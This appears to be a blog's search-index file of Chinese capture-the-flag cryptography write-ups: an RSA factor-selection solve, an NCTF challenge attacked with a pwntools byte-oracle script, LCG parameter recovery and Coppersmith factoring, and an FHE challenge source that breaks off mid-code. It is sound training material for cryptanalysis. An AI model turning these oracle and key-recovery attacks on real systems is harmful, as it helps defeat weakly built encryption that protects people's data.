<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2024BeginCTF Crypto--fake_N</title>
    <url>/2024/03/14/2024BeginCTF-Crypto-fake-N/</url>
    <content><![CDATA[<h1 id="FIRST"><a href="#FIRST" class="headerlink" title="FIRST"></a>FIRST</h1><span id="more"></span>

<p>首先分解fake_n,使用factordb.com，得到17个质因子</p>
<p><img src="/pic/2024BeginCTF-Crypto-fake-N/factor.png" alt="factor"></p>
<h1 id="second"><a href="#second" class="headerlink" title="second"></a>second</h1><p>阅读题目得真实的n为15个质因子的积，遍历17个质因子中15个的积作为真实的n，并求出phi，写出对应脚本为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line">fake_n_list=[<span class="number">2215221821</span> , <span class="number">2290486867</span> , <span class="number">2333428577</span> , <span class="number">2361589081</span> , <span class="number">2446301969</span> , <span class="number">2507934301</span>, <span class="number">2590663067</span> ,<span class="number">3107210929</span> ,<span class="number">3278987191</span>,<span class="number">3389689241</span>,<span class="number">3417707929</span>,<span class="number">3429664037</span>,<span class="number">3716624207</span>, <span class="number">3859354699</span>, <span class="number">3965529989</span>, <span class="number">4098704749</span>, <span class="number">4267348123</span>]</span><br><span class="line">c = <span class="number">6451324417011540096371899193595274967584961629958072589442231753539333785715373417620914700292158431998640787575661170945478654203892533418902</span></span><br><span class="line">fake_n = <span class="number">1</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fake_n_list)):</span><br><span class="line">    fake_n *= fake_n_list[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fake_n_list)):</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fake_n_list)):</span><br><span class="line">        n=fake_n//(fake_n_list[i]*fake_n_list[k])</span><br><span class="line">        phi=<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> fake_n_list:</span><br><span class="line">            <span class="keyword">if</span>(j!=fake_n_list[i] <span class="keyword">and</span> j!=fake_n_list[k]):</span><br><span class="line">                phi=phi*(j-<span class="number">1</span>)</span><br><span class="line">        d=inverse(e,phi)</span><br><span class="line">        x=long_to_bytes(<span class="built_in">pow</span>(c,d,n))</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">b&#x27;begin&#x27;</span> <span class="keyword">in</span> x):</span><br><span class="line">            <span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure>

<p>得到结果为</p>
<p>begin{y0u_f1nd_th3_re4l_n}</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>2025CryptoCTF</title>
    <url>/2025/07/16/2025CryptoCTF/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>2024NCTF复现</title>
    <url>/2025/03/25/2024NCTF%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>owo</p>
<p>爆零，不嘻嘻。</p>
<span id="more"></span>

<h1 id="Arcahv"><a href="#Arcahv" class="headerlink" title="Arcahv"></a>Arcahv</h1><p>一道大杂烩题目，其实赛后复现感觉自己应该也能做，可惜赛中没耐心细细分析代码。</p>
<h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom,getenv</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,seed:<span class="built_in">int</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.p = getPrime(<span class="number">1024</span>)</span><br><span class="line">        self.a = getPrime(<span class="number">1023</span>)</span><br><span class="line">        self.b = getPrime(<span class="number">1023</span>)</span><br><span class="line">        self.status = seed</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        ret = self.status</span><br><span class="line">        self.status = (self.status * self.a + self.b) % self.p</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crystal_trick</span>(<span class="params">m:<span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    m = <span class="built_in">bytearray</span>(m)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        m[i] = reduce(<span class="keyword">lambda</span> x,y: x^y^urandom(<span class="number">1</span>)[<span class="number">0</span>],m[:i],m[i])</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSA</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        p = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">        q = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">        self.p = p</span><br><span class="line">        self.N = p * q</span><br><span class="line">        self.e = <span class="number">65537</span></span><br><span class="line">        self.d = <span class="built_in">pow</span>(self.e, -<span class="number">1</span>, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self,m:<span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">pow</span>(m,self.e,self.N)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self,c:<span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">pow</span>(c,self.d,self.N) </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyRSA1</span>(<span class="title class_ inherited__">RSA</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self,m:<span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().encrypt(<span class="built_in">int</span>.from_bytes(m)).to_bytes(<span class="number">256</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self,c:<span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().decrypt(<span class="built_in">int</span>.from_bytes(c)).to_bytes(<span class="number">256</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyRSA2</span>(<span class="title class_ inherited__">RSA</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self,m:<span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">pow</span>(<span class="built_in">int</span>.from_bytes(m),self.e,self.N).to_bytes(<span class="number">256</span>,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self,c:<span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        m = <span class="built_in">pow</span>(<span class="built_in">int</span>.from_bytes(c),self.d,self.N).to_bytes(<span class="number">256</span>,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Hibiscus is here to trick your decryption result!!&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> crystal_trick(m)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Welcome to NCTF 2025 arcahv challenge!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">--- Menu ---</span></span><br><span class="line"><span class="string">[1] View encrypted flag and hint</span></span><br><span class="line"><span class="string">[2] Play with the decryption orcale</span></span><br><span class="line"><span class="string">[3] Get some random numbers for fun</span></span><br><span class="line"><span class="string">[4] Exit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your Option &gt; &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Loading, please wait...&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>).read().strip().encode()</span><br><span class="line">    <span class="comment">#flag = getenv(&#x27;FLAG&#x27;).encode()</span></span><br><span class="line">    attempts = <span class="number">75</span></span><br><span class="line">    r1 = MyRSA1()</span><br><span class="line">    r2 = MyRSA2()</span><br><span class="line">    hint1 = r2.encrypt(r1.p.to_bytes(<span class="number">128</span>))</span><br><span class="line"></span><br><span class="line">    key = urandom(<span class="number">16</span>)</span><br><span class="line">    hint2 = AES.new(key,AES.MODE_ECB).encrypt(r1.N.to_bytes(<span class="number">256</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">flag_and_hint</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Encrypted flag: <span class="subst">&#123;r1.encrypt(flag).<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Hint1: <span class="subst">&#123;hint1.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Hint2: <span class="subst">&#123;hint2.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rsachal</span>(): </span><br><span class="line">        <span class="keyword">global</span> attempts</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Since you didn&#x27;t v Hibiscus 50 on crazy thursday, Hibiscus decided to do some trick on your decryption result!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Your pubkey:(<span class="subst">&#123;<span class="built_in">hex</span>(r2.N)[<span class="number">2</span>:]&#125;</span>,<span class="subst">&#123;<span class="built_in">hex</span>(r2.e)[<span class="number">2</span>:]&#125;</span>)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> attempts &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;Do you still want to try decryption(y/[n])?&#x27;</span>) != <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            c = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">f&#x27;You have <span class="subst">&#123;attempts&#125;</span> remaining access to decryption orcale!\nYour ciphertext(in hex):&#x27;</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;Result: <span class="subst">&#123;r2.decrypt(c).<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line">            attempts -= <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> attempts == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Unfortunately, you are out of decryption attempts! Come back again on nctf2026 ~&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lcgchal</span>():</span><br><span class="line">        lcg = LCG(<span class="built_in">int</span>.from_bytes(key))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Tempering with LCG generator, please wait...&#x27;</span>)</span><br><span class="line">        <span class="keyword">while</span> urandom(<span class="number">1</span>)[<span class="number">0</span>] &amp; <span class="number">0xff</span>:</span><br><span class="line">            lcg.<span class="built_in">next</span>()</span><br><span class="line">        </span><br><span class="line">        hexnums = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">hex</span>(lcg.<span class="built_in">next</span>())[<span class="number">2</span>:] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(hexnums) % <span class="number">16</span>:</span><br><span class="line">            hexnums = hexnums.zfill((<span class="built_in">len</span>(hexnums) // <span class="number">16</span> + <span class="number">1</span>) * <span class="number">16</span>)</span><br><span class="line">        </span><br><span class="line">        idx = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">input</span>(<span class="string">&#x27;Do you want another unsigned long long number(y/[n])?&#x27;</span>) == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(hexnums[idx:idx+<span class="number">16</span>]),<span class="number">16</span>))</span><br><span class="line">            idx = (idx + <span class="number">16</span>) % <span class="built_in">len</span>(hexnums)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bye</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Hope you have fun during the challenge XD:)&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    fundc = &#123;<span class="number">1</span>:flag_and_hint,<span class="number">2</span>:rsachal,<span class="number">3</span>:lcgchal,<span class="number">4</span>:bye&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        opt = <span class="built_in">input</span>(menu)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(opt) == <span class="number">0</span> <span class="keyword">or</span> opt <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&#x27;1234&#x27;</span>:</span><br><span class="line">            opt = <span class="string">&#x27;4&#x27;</span></span><br><span class="line">        fundc[<span class="built_in">int</span>(opt)]()</span><br></pre></td></tr></table></figure>

<p>首先选项一交互得到密文，hint1，hint2.并且由</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hint1 = r2.encrypt(r1.p.to_bytes(<span class="number">128</span>))</span><br><span class="line"></span><br><span class="line">    key = urandom(<span class="number">16</span>)</span><br><span class="line">    hint2 = AES.new(key,AES.MODE_ECB).encrypt(r1.N.to_bytes(<span class="number">256</span>))</span><br></pre></td></tr></table></figure>

<p>不难看出，hint1是对p进行RSA加密得到的结果，那么很明显我们要通过后面的rsachall函数来对p进行解密。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rsachal</span>(): </span><br><span class="line">        <span class="keyword">global</span> attempts</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Since you didn&#x27;t v Hibiscus 50 on crazy thursday, Hibiscus decided to do some trick on your decryption result!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Your pubkey:(<span class="subst">&#123;<span class="built_in">hex</span>(r2.N)[<span class="number">2</span>:]&#125;</span>,<span class="subst">&#123;<span class="built_in">hex</span>(r2.e)[<span class="number">2</span>:]&#125;</span>)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> attempts &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;Do you still want to try decryption(y/[n])?&#x27;</span>) != <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            c = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">f&#x27;You have <span class="subst">&#123;attempts&#125;</span> remaining access to decryption orcale!\nYour ciphertext(in hex):&#x27;</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;Result: <span class="subst">&#123;r2.decrypt(c).<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line">            attempts -= <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> attempts == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Unfortunately, you are out of decryption attempts! Come back again on nctf2026 ~&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>值得注意的是这并不是一个普通的RSA加密，因为r2涉及到了一个混淆函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">crystal_trick</span>(<span class="params">m:<span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    m = <span class="built_in">bytearray</span>(m)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        m[i] = reduce(<span class="keyword">lambda</span> x,y: x^y^urandom(<span class="number">1</span>)[<span class="number">0</span>],m[:i],m[i])</span><br><span class="line">    <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure>

<p>我们试一下该函数的输出可以发现每次混淆之后第一个字节是不变的，根据此我们就可以通过多次交互来逐步还原p，一个字节8位，题目限定了75次交互，也就是我们最多只能还原高600位，此时未知424位，就可以用coppersmith去打。还原高600位涉及到的一个攻击思想是RSA LSB Orcale,我们需要逐步还原其高位。通过在 Z$_p$下将密文乘以 C$^e$，我们解密得到的明文即为 m′&#x3D;Cm modN。显然存在等式 m′+kN&#x3D;Cm。本题中由于我们可以得到 m′mod256，因而亦令 C&#x3D;256。从另一个角度理解就是为了保证一次爆尽可能多的字节，选256就是刚好爆一个字节(8位)，本质就是把范围缩小到1&#x2F;256.</p>
<p>不过我们看到给定的交互次数只有75次，在交互次数有限的情况下，应选择跳过前127次交互，因为已知这127次交互必定会得到 k&#x3D;0。接下来详细解释一下。</p>
<p>此时RSA素数 p，其位数为1024位，N位数就为2048位已知m′&#x3D;C<em>m</em>−kN(k∈Z)。若 Cm≥N，则 m′&#x3D;Cm−kN≥0，且 k≥1。但根据参数选择 C&#x3D;256$^{127}$，实际有 Cm&lt;N，</p>
<p>则m′&#x3D;Cm modN&#x3D;Cm−0⋅N&#x3D;Cm。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = enc_hint</span><br><span class="line">omit_count = <span class="number">127</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;(&#x27;</span>)</span><br><span class="line">rn = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;,&#x27;</span>, drop=<span class="literal">True</span>).strip().decode(), <span class="number">16</span>)</span><br><span class="line">re = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;)&#x27;</span>, drop=<span class="literal">True</span>).strip().decode(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">upper_bound = reduce(<span class="keyword">lambda</span> x, y: floor(x / <span class="number">256</span>), <span class="built_in">range</span>(omit_count), rn)</span><br><span class="line"></span><br><span class="line">lower_bound = <span class="number">0</span></span><br><span class="line">single_mul = <span class="built_in">pow</span>(<span class="number">256</span>, re, rn)</span><br><span class="line">inv = <span class="built_in">pow</span>(rn, -<span class="number">1</span>, <span class="number">256</span>)</span><br><span class="line"></span><br><span class="line">m = m * <span class="built_in">pow</span>(single_mul, omit_count, rn) % rn</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">75</span>):</span><br><span class="line">    m = <span class="built_in">int</span>(m * single_mul % rn)</span><br><span class="line"></span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;?&#x27;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, hexify_send(m))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    this = <span class="built_in">int</span>(io.recvline().strip().decode()[:<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    k = <span class="built_in">int</span>(-this * inv % <span class="number">256</span>)</span><br><span class="line">    ttl = (upper_bound - lower_bound) / <span class="number">256</span></span><br><span class="line"></span><br><span class="line">    lower_bound += ceil(k * ttl)</span><br><span class="line">    upper_bound = lower_bound + floor(ttl)</span><br><span class="line"></span><br><span class="line">res_pp = lower_bound</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;res_pp=<span class="subst">&#123;res_pp&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>第二部分是一个lcg。这就是一个很普通的逆推求key的过程。首先需要找到五个连续的输出，因为可以发现5个连续随机数是LCG参数完全未知时下还原 p 所需的最小数目。随后就是一个很基本的还原参数然后逆向求key。从任意输出 Xi开始，反向计算前驱状态，直至状态值的位长 ≤ 128位（即16字节），此时即为初始种子 <code>key</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">ls = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">80</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;?&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">    ls.append(<span class="built_in">int</span>(io.recvline().strip().decode()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hexstr = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">hex</span>(i)[<span class="number">2</span>:].zfill(<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> ls)</span><br><span class="line">lcgnums = [<span class="built_in">int</span>(hexstr[i:i+<span class="number">256</span>],<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(hexstr),<span class="number">256</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">A = [lcgnums[i+<span class="number">1</span>]-lcgnums[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">p = gcd(A[<span class="number">1</span>]^<span class="number">2</span> - A[<span class="number">2</span>]*A[<span class="number">0</span>],A[<span class="number">2</span>]^<span class="number">2</span> - A[<span class="number">3</span>]*A[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> isPrime(p):</span><br><span class="line">    p = factor(p)[-<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> isPrime(p)</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">int</span>(A[<span class="number">1</span>] * <span class="built_in">int</span>(<span class="built_in">pow</span>(A[<span class="number">0</span>],-<span class="number">1</span>,p)) % p)</span><br><span class="line">b = <span class="built_in">int</span>((lcgnums[<span class="number">1</span>] - a * lcgnums[<span class="number">0</span>]) % p)</span><br><span class="line"></span><br><span class="line">cur = Zmod(p)(lcgnums[<span class="number">0</span>])</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">int</span>(cur).bit_length() &gt; <span class="number">128</span>:</span><br><span class="line">    cur = (cur - b) * <span class="built_in">pow</span>(a,-<span class="number">1</span>,p)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">key = <span class="built_in">int</span>(cur).to_bytes(<span class="number">16</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">res_n = <span class="built_in">int</span>.from_bytes(AES.new(key,AES.MODE_ECB).decrypt(enc_hint2),<span class="string">&#x27;big&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>现在我们已经得到了p的600位高位和n，那么很明显接下来就是coppersmith在已知p高位下分解n，最后解密即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">P.&lt;x&gt; = Zmod(res_n)[]</span><br><span class="line">rt = (res_pp + x).small_roots(X=<span class="number">2</span>^<span class="number">453</span>,beta=<span class="number">0.4</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">p0 = <span class="built_in">int</span>(res_pp + rt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> res_n % p0 == <span class="number">0</span></span><br><span class="line">q0 = res_n // p0</span><br><span class="line"></span><br><span class="line">d0 = <span class="built_in">int</span>(<span class="built_in">pow</span>(<span class="number">65537</span>,-<span class="number">1</span>,(p0-<span class="number">1</span>)*(q0-<span class="number">1</span>)))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(enc_flag,d0,res_n))))</span><br></pre></td></tr></table></figure>

<h1 id="sign"><a href="#sign" class="headerlink" title="sign"></a>sign</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>srv.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> util <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> getenv</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">string = <span class="built_in">open</span>(<span class="string">&#x27;secret.txt&#x27;</span>).read().strip().encode()</span><br><span class="line">flag = getenv(<span class="string">&#x27;FLAG&#x27;</span>).encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    Keys = []</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> string:</span><br><span class="line">        f = FHE()</span><br><span class="line">        s = long_to_bytes(Random().getrandbits(<span class="number">20000</span>))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s[<span class="number">4</span>:]:</span><br><span class="line">            Keys.extend(f.encrypt([i]))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s[:<span class="number">4</span>]:</span><br><span class="line">            Keys.extend(f.encrypt([i * (m &amp; <span class="number">0x03</span>) % <span class="number">0x101</span>]))</span><br><span class="line">            m &gt;&gt;= <span class="number">2</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(Keys) == <span class="number">30000</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] Your ciphertext: <span class="subst">&#123;AES.new(md5(string).digest(),AES.MODE_ECB).encrypt(pad(flag,<span class="number">16</span>)).<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">input</span>(<span class="string">f&#x27;[+] The keys to retrieve the global internet connection are as follows:&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30000</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[+] <span class="subst">&#123;Keys[i]&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>util.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getrandint</span>(<span class="params">n:<span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(urandom(n//<span class="number">8</span>+<span class="number">1</span>)) % <span class="built_in">pow</span>(<span class="number">2</span>,n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FHE</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.p = getPrime(<span class="number">77</span>)</span><br><span class="line">        self.pubkeys = []</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            self.pubkeys.append(self.p * getrandint(<span class="number">177</span>) + (getrandint(<span class="number">17</span>) &lt;&lt; <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self,msg:<span class="built_in">list</span>[<span class="built_in">int</span>] | <span class="built_in">bytes</span></span>):</span><br><span class="line">        result = []</span><br><span class="line">        <span 